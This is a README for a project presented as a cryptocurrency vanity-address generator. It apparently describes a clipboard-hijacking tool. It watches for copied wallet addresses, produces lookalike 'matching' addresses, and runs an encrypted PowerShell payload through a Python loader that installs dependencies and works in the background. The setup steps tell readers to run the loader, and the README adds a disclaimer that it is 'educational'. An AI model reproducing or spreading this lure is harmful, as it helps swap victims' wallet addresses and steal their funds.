# Cryptocurrency Vanity Address Generator

A cryptocurrency vanity-address generation application designed to monitor clipboard activity, recognize copied cryptocurrency addresses, and generate vanity addresses based on detected address patterns.

## Overview

This application combines cryptocurrency vanity-address generation with clipboard monitoring functionality.

When a cryptocurrency address is copied to the clipboard, the application is designed to recognize the copied address and initiate vanity-address generation.

The project uses an encrypted PowerShell payload launched through a Python-based loader.

## Features

- **Clipboard Monitoring:** Detects copied cryptocurrency addresses.
- **Address Recognition:** Identifies cryptocurrency address formats.
- **Vanity Address Generation:** Generates cryptocurrency addresses with customizable or matching character patterns.
- **Encrypted Payload:** Stores application functionality in an encrypted `Advanced.dat` file.
- **Cryptographic Protection:** Uses PBKDF2, AES-256-CBC, and HMAC-SHA256.
- **Automatic Dependency Installation:** Installs required Python libraries on startup.
- **PowerShell Integration:** Executes the decrypted application payload on Windows.

## Project Structure

```text
project/
├── run.py
├── Advanced.dat
└── README.md
```

## Requirements

- Windows operating system
- Python 3
- Internet connection for initial dependency installation
- Windows PowerShell

## Installation and Usage

1. Download or clone this repository.
2. Ensure `run.py` and `Advanced.dat` are in the same directory.
3. Open a terminal in the project directory.
4. Execute:

```bash
python run.py
```

The application automatically installs its required dependencies and prepares the environment before launching.

## Testing

After launching the application:

1. Allow the initial setup and dependency installation to complete.
2. Open any application where you can copy text.
3. Copy a cryptocurrency address to your clipboard.
4. Observe the application's response.

Testing can be performed using your own clipboard and test addresses.

## Stopping the Application

To stop the running application, press the following keyboard shortcut:

**`Ctrl + Win + S`**

This shortcut is used to terminate the application's background operation.

## Technical Implementation

| Component | Algorithm |
|---|---|
| Key Derivation | PBKDF2-HMAC-SHA256 |
| Encryption | AES-256-CBC |
| Authentication | HMAC-SHA256 |
| Padding | PKCS7 |
| AES Key Length | 256 bits |
| AES PBKDF2 Iterations | 50,000 |
| HMAC PBKDF2 Iterations | 50,001 |

The Python loader verifies the encrypted payload's HMAC before decrypting and executing it.

## Execution Workflow

1. Launch `run.py`.
2. Install required dependencies.
3. Read `Advanced.dat`.
4. Derive encryption and authentication keys.
5. Verify payload integrity.
6. Decrypt the PowerShell application.
7. Launch the application.
8. Monitor clipboard activity and perform the configured vanity-address generation functionality.

## Security Considerations

- Use test cryptocurrency addresses when evaluating the application.
- Never expose private keys or recovery phrases.
- Independently verify generated addresses.
- Review clipboard modifications before cryptocurrency transactions.
- Do not use the application with real funds until its behavior has been independently audited.

## Disclaimer

This project is provided for educational and research purposes. Users are responsible for understanding the application's behavior and the security implications of clipboard monitoring and cryptocurrency address generation.